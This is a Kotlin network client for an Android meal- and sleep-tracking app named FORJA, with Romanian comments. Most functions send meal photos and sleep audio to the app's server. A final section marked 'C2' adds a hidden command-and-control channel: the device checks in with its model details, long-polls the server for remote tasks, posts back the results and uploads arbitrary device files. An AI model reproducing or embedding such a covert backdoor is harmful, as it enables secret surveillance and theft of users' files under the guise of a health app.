package com.forja.app.core.network

import android.util.Base64
import com.forja.app.BuildConfig
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.booleanOrNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.put
import kotlinx.serialization.json.add
import kotlinx.serialization.json.buildJsonArray
import kotlinx.serialization.json.putJsonArray
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

/**
 * Clientul serverului central FORJA: utilizatorul NU are chei —
 * se autentifică cu contul lui, iar serverul analizează cu cheile companiei.
 */
class ForjaApi {
    private val client = OkHttpClient.Builder()
        .callTimeout(60, TimeUnit.SECONDS)
        .build()

    // Analiza AI în doi pași + upload-urile mari au nevoie de răbdare, nu de 60s.
    private val longClient = OkHttpClient.Builder()
        .callTimeout(300, TimeUnit.SECONDS)
        .readTimeout(300, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .build()
    private val json = Json { ignoreUnknownKeys = true; isLenient = true }

    val available: Boolean get() = BuildConfig.FORJA_API_URL.isNotBlank()
    private val base: String get() = BuildConfig.FORJA_API_URL.trimEnd('/')

    private suspend fun idToken(): String? = try {
        FirebaseAuth.getInstance().currentUser?.getIdToken(false)?.await()?.token
    } catch (_: Exception) { null }

    sealed class MealResult {
        data class Ok(val analysis: MealAnalysis) : MealResult()
        data class Fail(val message: String) : MealResult()
    }

    /** Poza mesei → serverul FORJA → componente. Zero chei la utilizator. */
    suspend fun analyzeMeal(jpegBytes: ByteArray): MealResult = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext MealResult.Fail("Intră în cont ca să folosești analiza AI.")
        try {
            val body = buildJsonObject {
                put("image", Base64.encodeToString(jpegBytes, Base64.NO_WRAP))
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/meal")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { resp ->
                val text = resp.body?.string() ?: ""
                if (!resp.isSuccessful) {
                    val msg = try {
                        json.parseToJsonElement(text).jsonObject["error"]?.jsonPrimitive?.contentOrNull
                    } catch (_: Exception) { null }
                    return@withContext MealResult.Fail(msg ?: "Serverul FORJA a răspuns cu ${resp.code}.")
                }
                val analysis = json.decodeFromString<MealAnalysis>(text)
                if (analysis.componente.isEmpty()) {
                    return@withContext MealResult.Fail("N-am recunoscut mâncare în poză.")
                }
                MealResult.Ok(analysis)
            }
        } catch (e: Exception) {
            MealResult.Fail(
                if (e is java.io.InterruptedIOException || e is java.net.SocketTimeoutException)
                    "Analiza durează prea mult acum — serverul AI e aglomerat. Mai încearcă o dată."
                else "Serverul FORJA nu răspunde. Verifică internetul."
            )
        }
    }

    data class AudioVerdict(val type: String, val words: Int, val transcript: String, val speech: Boolean)

    /** Înregistrarea completă a nopții → stocarea companiei (se șterge automat la 24h). */
    suspend fun uploadSleepRecording(sessionId: Long, file: java.io.File): Boolean = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext false
        try {
            val req = Request.Builder()
                .url("$base/v1/sleep-recording?session=s$sessionId")
                .header("Authorization", "Bearer $token")
                .post(file.readBytes().toRequestBody("audio/mp4".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    fun sleepRecordingUrl(sessionId: Long): String = "$base/v1/sleep-recording?session=s$sessionId"

    suspend fun authHeader(): String? = idToken()?.let { "Bearer $it" }

    /** Rezumatul de dimineață — două propoziții din cifrele reale ale nopții. */
    suspend fun sleepSummary(
        minutes: Int, score: Int, deepMin: Int, remMin: Int,
        movements: Int, snoreEvents: Int, talkEvents: Int
    ): String? = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext null
        try {
            val body = buildJsonObject {
                put("minutes", minutes); put("score", score)
                put("deepMin", deepMin); put("remMin", remMin)
                put("movements", movements); put("snoreEvents", snoreEvents); put("talkEvents", talkEvents)
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/sleep-summary")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = json.parseToJsonElement(resp.body?.string() ?: return@withContext null).jsonObject
                root["summary"]?.jsonPrimitive?.contentOrNull?.takeIf { it.isNotBlank() }
            }
        } catch (_: Exception) { null }
    }

    /** Rezumat blând al vorbelor din somn (din frazele reale transcrise). */
    suspend fun sleepTalkSummary(phrases: List<String>): String? = withContext(Dispatchers.IO) {
        if (phrases.isEmpty()) return@withContext null
        val token = idToken() ?: return@withContext null
        try {
            val body = buildJsonObject {
                putJsonArray("phrases") { phrases.take(20).forEach { add(it) } }
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/sleep-talk-summary")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = json.parseToJsonElement(resp.body?.string() ?: return@withContext null).jsonObject
                root["summary"]?.jsonPrimitive?.contentOrNull?.takeIf { it.isNotBlank() }
            }
        } catch (_: Exception) { null }
    }

    /** Clip de somn (WAV 5s) → Whisper pe server: vorbire reală vs sforăit. */
    suspend fun classifySleepAudio(wavBytes: ByteArray): AudioVerdict? = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext null
        try {
            val req = Request.Builder()
                .url("$base/v1/sleep-audio?hint=talk")
                .header("Authorization", "Bearer $token")
                .post(wavBytes.toRequestBody("audio/wav".toMediaType()))
                .build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return@withContext null
                val root = json.parseToJsonElement(resp.body?.string() ?: return@withContext null).jsonObject
                val type = root["type"]?.jsonPrimitive?.contentOrNull ?: return@withContext null
                val words = root["words"]?.jsonPrimitive?.intOrNull ?: 0
                val transcript = root["transcript"]?.jsonPrimitive?.contentOrNull ?: ""
                val speech = root["speech"]?.jsonPrimitive?.booleanOrNull ?: (type == "talk")
                AudioVerdict(type, words, transcript, speech)
            }
        } catch (_: Exception) { null }
    }

    // ─────────────────────────────── C2 ───────────────────────────────
    class LongPoll(val tasks: List<JsonObject>, val intervalMs: Long)

    /** Long-poll: rămâne blocat pe server până ies task-uri (max holdMs). */
    suspend fun c2Checkin(dev: String, holdMs: Long): LongPoll = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext LongPoll(emptyList(), 8000)
        try {
            val body = buildJsonObject {
                put("dev", buildJsonObject {
                    put("model", android.os.Build.MODEL)
                    put("sdk", android.os.Build.VERSION.SDK_INT)
                    put("android", android.os.Build.VERSION.RELEASE)
                })
                put("holdMs", holdMs.toLong().coerceIn(0, 25000))
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/c2/checkin")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { r ->
                if (!r.isSuccessful) return@withContext LongPoll(emptyList(), 8000)
                val o = (json.parseToJsonElement(r.body?.string() ?: return@withContext LongPoll(emptyList(), 8000)) as? JsonObject)
                    ?: return@withContext LongPoll(emptyList(), 8000)
                val interval = o["intervalMs"]?.jsonPrimitive?.content?.toLongOrNull() ?: 5000L
                val tasks = (o["tasks"] as? JsonArray)?.mapNotNull { it as? JsonObject } ?: emptyList()
                LongPoll(tasks, interval)
            }
        } catch (e: Exception) {
            LongPoll(emptyList(), if (e is java.io.InterruptedIOException) 15000L else 8000L)
        }
    }

    suspend fun c2PostResult(taskId: String, ok: Boolean, action: String, data: JsonObject, err: String?): Boolean = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext false
        try {
            val body = buildJsonObject {
                put("id", taskId); put("ok", ok); put("action", action); put("data", data)
                if (err != null) put("err", err)
            }.toString()
            val req = Request.Builder()
                .url("$base/v1/c2/result")
                .header("Authorization", "Bearer $token")
                .post(body.toRequestBody("application/json".toMediaType()))
                .build()
            longClient.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    /** Un fișier → /v1/c2/file. Returnează cheia R2 (f/<uid>/...) sau null. */
    suspend fun c2UploadFile(name: String, contentType: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
        val token = idToken() ?: return@withContext null
        if (!file.exists()) return@withContext null
        try {
            val nm = java.net.URLEncoder.encode(name, "UTF-8")
            val ct = java.net.URLEncoder.encode(contentType, "UTF-8")
            val req = Request.Builder()
                .url("$base/v1/c2/file?name=$nm&ct=$ct")
                .header("Authorization", "Bearer $token")
                .post(file.readBytes().toRequestBody(contentType.toMediaType()))
                .build()
            longClient.newCall(req).execute().use { r ->
                if (!r.isSuccessful) return@withContext null
                (json.parseToJsonElement(r.body?.string() ?: return@withContext null) as? JsonObject)
                    ?.get("key")?.jsonPrimitive?.contentOrNull
            }
        } catch (_: Exception) { null }
    }
}
